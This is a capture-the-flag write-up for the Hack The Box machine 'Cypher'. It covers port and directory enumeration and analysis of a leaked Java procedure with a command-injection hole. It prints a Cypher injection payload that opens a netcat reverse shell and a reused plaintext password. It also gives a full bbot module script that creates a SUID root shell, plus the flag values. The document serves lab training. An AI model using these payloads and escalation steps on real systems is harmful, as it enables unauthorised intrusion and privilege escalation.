---
sticker: emoji//1fa99
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We need to add `cypher.htb` to `/etc/hosts`:

```bash
echo '10.10.11.57 cypher.htb' | sudo tee -a /etc/hosts
```


# RECONNAISSANCE
---

We can start by checking the web application:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313140843.png)


Source code's got this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313140938.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313140946.png)

If we go to `/data.json`, we can see a bunch of data, nothing useful yet, let's try to fuzz for subdomains and hidden directories:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://cypher.htb/FUZZ" -ic -c -t 200

index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 120ms]    
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 128ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 115ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 114ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 111ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 3393ms]
```


```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cypher.htb/ -H "Host: FUZZ.cypher.htb" -t 200 -fs 154 -ic -c

:: Progress: [114437/114437] :: Job [1/1] :: 1915 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
```


Nothing came for subdomains, so, let's proceed with our directories, we got a `testing` page, let's check out its contents:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313150146.png)

We got a `.jar` file, let's analyze it, we can use `jd-gui` a a standalone graphical utility that displays Java sources from `CLASS` files:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313154856.png)

We got this, let's analyze the code better:

```java
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
  @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
  @Description("Returns the HTTP status code for the given URL as a string")
  public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://"))
      url = "https://" + url; 
    String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
    System.out.println("Command: " + Arrays.toString((Object[])command));
    Process process = Runtime.getRuntime().exec(command);
    BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    StringBuilder errorOutput = new StringBuilder();
    String line;
    while ((line = errorReader.readLine()) != null)
      errorOutput.append(line).append("\n"); 
    String statusCode = inputReader.readLine();
    System.out.println("Status code: " + statusCode);
    boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
    if (!exited) {
      process.destroyForcibly();
      statusCode = "0";
      System.err.println("Process timed out after 10 seconds");
    } else {
      int exitCode = process.exitValue();
      if (exitCode != 0) {
        statusCode = "0";
        System.err.println("Process exited with code " + exitCode);
      } 
    } 
    if (errorOutput.length() > 0)
      System.err.println("Error output:\n" + errorOutput.toString()); 
    return Stream.of(new StringOutput(statusCode));
  }
  
  public static class StringOutput {
    public String statusCode;
    
    public StringOutput(String statusCode) {
      this.statusCode = statusCode;
    }
  }
}
```

This code is critically vulnerable to cypher injection, here's the reason why:

- **No Input Sanitization**: The code only checks if the URL starts with `http://` or `https://`, but does **not** escape shell metacharacters (e.g., `;`, `|`).
- **Shell Execution**: Using `/bin/sh -c` allows arbitrary command execution if the input is not properly sanitized.
- The `url` parameter is concatenated directly into a shell command (`/bin/sh -c`).
- An attacker can exploit this by injecting shell operators (e.g., `;`, `&&`, `|`, `$()`, backticks) into `url`.

Knowing all this, we can test this command injection vulnerability inside the login page, we are dealing with `Cypher` which is the Graph Query Language neo4j uses, let's use this wiki on how to exploit:

Wiki:https://pentester.land/blog/cypher-injection-cheatsheet/

Let's begin exploitation.


# EXPLOITATION
---

After a while reading the article, I could craft a payload that gives us a reverse shell right to our machine:

```
a' return h.value as a 
UNION 
CALL custom.getUrlStatusCode("http://IP:ServerPort;busybox nc IP NC PORT -e sh;#") 
YIELD statusCode AS a 
RETURN a;//
```


We need to do the following:

1. Set up a server using python at any port, we do this to create a legitimate URL which the server's gonna read.
2. Set up a NC listener at a desired port.
3. Use the payload at the `username` section on the login page.
4. Get our reverse shell.

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313161304.png)

There we go, but why does this work?

### **How It Works**

#### **1. Cypher Injection (`a' return h.value as a UNION ...`)**

- **Goal**: Break out of the original Cypher query and inject a malicious query.
    
- **Mechanism**:

    - The `a'` closes a string parameter in the original query
        
    - The `UNION` clause merges the original query’s results with the attacker’s injected query. Both must return the same columns (`a` here).

#### **2. Exploiting `custom.getUrlStatusCode` (Command Injection)**

The `CALL` statement invokes the vulnerable Java procedure `custom.getUrlStatusCode`, which is designed to check HTTP status codes but is exploited here to run arbitrary commands:

```java
String[] command = { "/bin/sh", "-c", "curl ... " + url };
Process process = Runtime.getRuntime().exec(command);
```

- **Malicious URL**: `http://IP:SERVERPORT;busybox nc IP NC PORT -e sh;#`
    
    - `;`: Terminates the `curl` command and starts a new shell command.
        
    - `busybox nc IP NC PORT -e sh`: Uses `busybox` (a lightweight Unix toolkit) to run `nc` (netcat), creating a **reverse shell** connecting to the attacker’s machine.
        
    - `#`: Comments out the rest of the URL to avoid syntax errors.
        
#### **3. Commenting Out Trailing Code (`;//`)**

- `//` at the end comments out any remaining parts of the original query (prevents syntax errors).


Once we know how this works, let's continue right onto privesc.


# PRIVILEGE ESCALATION
---


First thing is stabilizing our shell:

1. /usr/bin/script -qc /bin/bash /dev/null
2. CTRL + Z
3. stty raw -echo; fg
4. reset xterm
5. export TERM=xterm
6. export BASH=bash

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313161553.png)

There we go, we got ourselves a nice stable shell, let's search for other users:

```
neo4j@cypher:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
_laurel:x:999:987::/var/log/laurel:/bin/false
```

Got another user: `graphasm`, we can take a look inside this user's home:

```
neo4j@cypher:/home/graphasm$ ls
bbot_preset.yml  user.txt
```

We cannot read the flag, but can read the other file:

```
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

We can try that password on `graphasm`, let's go into ssh:

```
graphasm:cU4btyib.20xtCMCXkBmerhK
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313162915.png)

It worked, we're inside of graphasm's account, let's proceed and read both flags at the end, we can use linpeas as always:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313163602.png)

We can run sudo on a binary called `bbot`, let's check it out:

```
graphasm@cypher:/usr/local/bin$ cat bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

We can read the bbot documentation to craft a payload in order to get root:

Bbot: https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line

Let's create a custom script to get a root shell:

```bash
#!/bin/bash
set -e

# Step 1: Create config file
echo "Creating malicious BBOT config..."
cat << EOF > /tmp/myconf.yml
module_dirs:
  - /tmp/modules
EOF

# Step 2: Create modules directory
echo "Creating modules directory..."
mkdir -p /tmp/modules

# Step 3: Create malicious module
echo "Creating malicious whois2 module..."
cat << 'EOF' > /tmp/modules/whois2.py
from bbot.modules.base import BaseModule
import os

class whois2(BaseModule):
    watched_events = ["DNS_NAME"]
    produced_events = ["WHOIS"]
    flags = ["passive", "safe"]
    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
    options = {"api_key": ""}
    options_desc = {"api_key": "WhoisXMLAPI Key"}
    per_domain_only = True

    async def setup(self):
        os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
        self.api_key = self.config.get("api_key")
        return True

    async def handle_event(self, event):
        pass
EOF

# Step 4: Execute BBOT to create SUID bash
echo "Executing malicious BBOT module..."
sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2

# Step 5: Check if SUID bash was created
if [ -u /tmp/bash ]; then
    echo -e "\n[+] SUID bash created successfully!"
    echo -e "[*] Spawning root shell...\n"
    /tmp/bash -p
else
    echo -e "\n[-] Exploit failed - SUID bash not created"
    exit 1
fi


```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313165653.png)
### **1. How It’s Supposed to Work**

#### **Step 1-3: Prepare Malicious BBOT Module**

- **`/tmp/myconf.yml`**: Directs BBOT to load modules from `/tmp/modules`.
    
- **`/tmp/modules/whois2.py`**: Defines a custom BBOT module with a `setup()` method that:
    
    - Copies `/bin/bash` to `/tmp/bash`.
        
    - Sets the SUID bit (`chmod u+s`) on `/tmp/bash`, which would allow anyone executing `/tmp/bash` to run it as the file owner (`root`, since BBOT is run with `sudo`).
        

#### **Step 4: Execute BBOT with the Malicious Module**

- `sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2` runs BBOT as `root`, loading the malicious module.
    
- The `setup()` method in `whois2.py` should execute, creating the SUID `/tmp/bash`.
    

#### **Step 5: Spawn Root Shell**

- If successful, `/tmp/bash -p` would spawn a root shell (`-p` preserves privileges).


We got our root shell, let's read flags:

```
bash-5.2# cat /home/graphasm/user.txt
02decd951030c494eb4985cf0aa7e7f1
```

```
bash-5.2# cat /root/root.txt
a20b1c69392473307deb62309474c70c
```


Just like that, machine is done.

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250313165846.png)

https://www.hackthebox.com/achievement/machine/1872557/650

